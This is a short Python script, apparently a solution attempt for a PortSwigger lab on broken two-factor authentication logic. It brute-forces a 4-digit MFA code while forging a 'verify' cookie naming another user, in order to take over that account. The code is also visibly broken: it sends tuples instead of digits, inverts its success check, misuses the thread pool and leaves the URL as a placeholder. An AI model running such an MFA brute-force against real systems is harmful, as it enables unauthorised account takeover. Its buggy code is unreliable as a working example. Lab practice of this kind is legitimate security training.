import requests
import itertools
import string
import concurrent

# Lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
req = requests.Session()

url = "link"

cookies = {
    'session': 'OzzBpxOCXMUQOtGHkWPmykq24Bey8ycF',
    'verify': 'carlos'
    }
numbers = itertools.product(string.digits, repeat=4)


def brute():
    for pin in itertools.product(string.digits, repeat=4):
        login = requests.post(url, cookies=cookies, data={'mfa': f'{pin}'})
        
        if "Incorrect security code" in login.text:
            found = pin
    return found


with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
    processes = executor.map(brute)